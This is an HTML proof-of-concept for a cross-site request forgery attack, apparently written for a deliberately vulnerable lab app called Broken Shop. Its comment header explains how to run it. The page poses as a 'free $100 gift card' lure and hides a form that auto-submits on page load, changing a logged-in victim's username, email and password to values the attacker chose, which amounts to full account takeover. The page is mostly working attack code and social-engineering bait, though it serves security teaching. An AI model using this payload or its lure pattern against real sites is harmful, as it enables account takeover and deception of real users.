<!DOCTYPE html>
<!--
  CSRF PROOF-OF-CONCEPT  -  Broken Shop  -  Account takeover via password change
  =============================================================================
  Scenario: a victim is logged in to Broken Shop in another browser tab. They
  open this attacker-controlled page (different origin). Their browser auto-
  submits the hidden form below to /profile/, carrying the victim's session
  cookie. Because the app has NO CSRF protection, the POST is accepted and the
  victim's password is changed to one the attacker chose -> full takeover.

  HOW TO RUN
  1. Start the app:            python manage.py runserver
  2. Seed + log in as a victim (e.g. carol / Carol#2024) in one browser tab.
  3. Open THIS file from a DIFFERENT origin so it is a true cross-site request,
     e.g. serve it on another port:
         python -m http.server 9000     (run in the labs/csrf folder)
     then browse to http://localhost:9000/change_password.html
  4. The form auto-submits. Now log in as carol with the NEW password below.

  NOTE: the app overwrites username/email/password from whatever is POSTed and
  performs NO current-password check, so the attacker fully controls the result.
-->
<html lang="en">
<head><meta charset="UTF-8"><title>Free Gift Card - Click to claim!</title></head>
<body>
    <h1>🎁 Congratulations! Claim your free $100 gift card…</h1>
    <p>Loading your reward…</p>

    <!-- The malicious cross-site request. TARGET points at the victim app. -->
    <form id="csrf" action="http://127.0.0.1:8000/profile/" method="POST">
        <input type="hidden" name="username"     value="carol">
        <input type="hidden" name="email"        value="carol@example.com">
        <input type="hidden" name="new_password" value="pwned12345">
        <!-- No {% csrf_token %} here - the attacker cannot read the victim's
             token, and the server never checks for one anyway. -->
    </form>

    <script>
        // Fire automatically so the victim only has to open the page.
        document.getElementById("csrf").submit();
    </script>
</body>
</html>
